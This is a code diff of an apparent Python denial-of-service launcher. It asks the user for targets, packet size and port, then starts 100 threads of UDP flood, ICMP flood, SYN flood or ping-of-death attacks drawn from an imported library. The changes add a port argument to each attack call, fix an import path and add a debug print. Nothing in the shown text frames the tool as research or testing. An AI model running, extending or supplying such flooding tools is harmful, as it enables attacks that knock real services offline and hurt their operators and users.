@@ -3,30 +3,30 @@ import threading as th
 import time
 import sys
 import os
-import lib/test_lib as ty
+import test_lib as ty
 
 choices = [1, 2, 3]
 Threads = []
-
-
 
 try:
     attack_type = int(input("choose a type of attack: \n volume based attack(1), protocol attack(2), application layer attack(3)\n")) #type of attack
     vector = input("target(targets):\n").split(" ") #target
     bye = input("number of bytes: \n").encode() #packet size
+    port = int(input("chose an internet port for the attack: (if the attack is an application layer attack just press enter)\n"))
 
     if attack_type == choices[0]:
         volumeBaseAttack = ty.VolumeBasedAttack
         subtype0 = int(input("udp_flooding(1) or ICMP(2)\n"))
         
         if subtype0 == 1:
-            udp_floo = volumeBaseAttack.udp_flooding(vector, bye)
+            udp_floo = volumeBaseAttack.udp_flooding(vector, bye, port)
             for i in range(100):
                 t = th.Thread(target=udp_floo, args=(i,))
                 Threads.append(t)
                 t.start()
+                print("debugging")
         else:
-            ICMP = volumeBaseAttack.icmp(vector, bye)
+            ICMP = volumeBaseAttack.icmp(vector, bye, port)
             for i in range(100):
                 t = th.Thread(target=ICMP, args=(i,))
                 Threads.append(t)
@@ -36,13 +36,13 @@ try:
         protocolAttack = ty.ProtocolAttack
         subtype1 = int(input("Syn_flood(1) or pof(2)\n"))
         if subtype1 == 1:
-            Syn_flood = protocolAttack.syn_flood(vector, bye)
+            Syn_flood = protocolAttack.syn_flood(vector, bye, port)
             for i in range(100):
                 t = th.Thread(target=Syn_flood, args=(i,))
                 Threads.append(t)
                 t.start()
         else:
-            pof = protocolAttack.pof(vector, bye)
+            pof = protocolAttack.pof(vector, bye, port)
             for i in range(100):
                 t = th.Thread(target=pof, args=(i,))
                 Threads.append(t)
